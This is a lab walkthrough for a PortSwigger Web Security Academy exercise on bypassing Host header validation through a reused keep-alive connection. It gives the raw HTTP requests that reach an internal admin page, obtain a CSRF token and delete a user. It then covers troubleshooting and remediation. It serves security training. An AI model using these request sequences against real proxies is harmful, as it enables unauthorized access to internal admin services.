# Lab: Host Validation Bypass via Connection State Attack

**Category:** HTTP Host Header Attacks
**Difficulty:** Expert
**Lab link:** [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

## Overview

The front-end proxy validates the `Host` header on the **first request** of a TCP connection. For subsequent requests on the same keep-alive connection, it reuses the established routing without re-validating the host — allowing an attacker to target internal services that would normally be rejected.

## Key Concepts

- **Connection state trust:** The proxy only validates the Host on the first request; subsequent requests on the same connection bypass this check.
- **HTTP/1.1 keep-alive required:** HTTP/2 binds routing to the connection endpoint and can't be manipulated this way.
- **Full headers required on request 2:** The internal server needs the session cookie, `_lab` cookie, and standard browser headers to process the POST — a minimal request gets 421.
- **Burp "Send group (single connection)":** Both requests must share the same TCP connection — use the group send feature, not the normal send button.

## Exploit Flow

```
Request 1: Host: <lab>.web-security-academy.net  → proxy validates, establishes trust
Request 2: Host: 192.168.0.1                      → proxy skips re-validation, routes to internal admin
```

## Solution

### Step 1 — Set up two requests in a Repeater group

**Request 1 (establishes connection trust):**
```http
GET / HTTP/1.1
Host: <lab>.web-security-academy.net
Cookie: session=<session>; _lab=<lab-cookie>
Connection: keep-alive
```

**Request 2 (fetch admin page — get CSRF token):**
```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Cookie: session=<session>; _lab=<lab-cookie>
Connection: keep-alive
```

Group the tabs → **Send group (single connection)**.

### Step 2 — Get CSRF token

Request 2 response contains the admin form with:
```html
<input type="hidden" name="csrf" value="TOKEN">
```

### Step 3 — Delete carlos

Add a third request to the group with **all browser headers** (stripped-down requests get 421):

```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=<session>; _lab=<lab-cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=TOKEN&username=carlos
```

Send the group (single connection). Lab solved.

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| "Connection closed during request sequence" | First response has `Connection: close` | Ensure correct lab is open; add session cookie to request 1 |
| Response title shows a different lab | Wrong lab instance open | Open the correct lab URL |
| 421 on request 2 | Minimal headers — internal server rejects | Include full browser headers + both cookies on request 2 |
| Timeout on requests | HTTP/2 in use | Switch Repeater to HTTP/1.1 |

## Remediation

- Re-validate the `Host` header on every request, not just the first in a connection.
- Do not expose internal admin interfaces on the same network reachable by the proxy.
- Use strict per-request Host allowlist validation at the proxy layer.

## Key Takeaways

- Connection state attacks exploit per-connection (not per-request) validation — a subtle but high-impact flaw.
- Always use "Send group (single connection)" in Burp Repeater; normal send opens a new connection each time.
- Full request headers are often needed even for internal endpoints — 421 on a minimal request doesn't mean the IP is wrong.
